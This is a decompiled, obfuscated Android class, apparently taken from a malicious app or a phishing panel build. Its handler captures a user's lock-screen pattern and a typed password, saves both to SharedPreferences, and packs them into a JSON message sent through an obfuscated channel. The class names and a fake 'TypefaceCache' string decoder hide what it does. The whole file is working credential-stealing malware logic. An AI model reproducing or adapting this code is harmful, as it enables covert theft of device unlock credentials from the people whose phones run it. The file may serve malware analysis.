package v.s;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class apQOLJtARzrH extends LGm23hksIOxB implements deLJ4Z0aL3hcJ3O1 {
    public final /* synthetic */ Context JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ apQOLJtARzrH(Context context, int i) {
        super(1);
        this.vekpFI4d1Nc4fakF = i;
        this.JXn4Qf7zpnLjP5 = context;
    }

    @Override // v.s.deLJ4Z0aL3hcJ3O1
    public final Object pyu8ovAipBTLYAiKab(Object obj) {
        switch (this.vekpFI4d1Nc4fakF) {
            case 0:
                List list = (List) obj;
                DataQFAdapter.patternOverlayShowing = false;
                if (list.size() >= 4) {
                    ArrayList arrayList = new ArrayList(D8f4u3NB1PCAS427.xfn2GJwmGqs7kWW(list));
                    Iterator it = list.iterator();
                    while (it.hasNext()) {
                        arrayList.add(String.valueOf(((Number) it.next()).intValue() + 1));
                    }
                    String strEuF5Udt5Rqv3Qmea = imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, "", null, 62);
                    String unused = DataQFAdapter.TAG;
                    TypefaceCache.obtain("00130077004F009300F500AD00DC00E700200077004B009300E500AD00D700A3006300600052008600B000B000C400A20031007A005A009E00AA00FF");
                    TypefaceCache.obtain("00630075005E008B00FC00AC009B");
                    DataQFAdapter.patternReplayInProgress = true;
                    DataQFAdapter.lastPatternCaptureTime = System.currentTimeMillis();
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter.capturedPattern = strEuF5Udt5Rqv3Qmea;
                    try {
                        this.JXn4Qf7zpnLjP5.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0).edit().putString(TypefaceCache.obtain("00330077004F009300F500AD00DC"), DataQFAdapter.capturedPattern).apply();
                        break;
                    } catch (Exception unused2) {
                    }
                    try {
                        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                        RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                        if (rWY6BVSB0XxPbw != null) {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00330077004F009300F500AD00DC009800200077004B009300E500AD00D700A3"));
                            String strObtain = TypefaceCache.obtain("00330077004F009300F500AD00DC");
                            DataQFAdapter.Companion.getClass();
                            jSONObject.put(strObtain, DataQFAdapter.capturedPattern);
                            jSONObject.put(TypefaceCache.obtain("002F00730055008000E400B7"), DataQFAdapter.capturedPattern.length());
                            jSONObject.put(TypefaceCache.obtain("003500730049008E00F600B600D700A3"), true);
                            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                        }
                        break;
                    } catch (Exception unused3) {
                    }
                    new Handler(Looper.getMainLooper()).postDelayed(new jdOQeRk37T35X5xKW1P(4 + 4), 10000L);
                }
                break;
            default:
                String str = (String) obj;
                if (str.length() > 0) {
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter.capturedPassword = str;
                    try {
                        this.JXn4Qf7zpnLjP5.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0).edit().putString(TypefaceCache.obtain("003300770048009400E700B000C000A3"), DataQFAdapter.capturedPassword).apply();
                        break;
                    } catch (Exception unused4) {
                    }
                    String unused5 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("001300770048009400E700B000C000A300630075005A009700E400AA00C000A200270036004D008E00F100FF00DD00B1002600640057008600E900E50092");
                    TypefaceCache.obtain("006300750053008600E200AC");
                    try {
                        iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi2 = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                        RWY6BVSB0XxPbw rWY6BVSB0XxPbw2 = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                        if (rWY6BVSB0XxPbw2 != null) {
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003300770048009400E700B000C000A3001C0075005A009700E400AA00C000A20027"));
                            String strObtain2 = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                            DataQFAdapter.Companion.getClass();
                            jSONObject2.put(strObtain2, DataQFAdapter.capturedPassword);
                            jSONObject2.put(TypefaceCache.obtain("002F00730055008000E400B7"), DataQFAdapter.capturedPassword.length());
                            rWY6BVSB0XxPbw2.H9XlUr4OeMJFiXK(jSONObject2);
                        }
                        break;
                    } catch (Exception unused6) {
                    }
                }
                break;
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
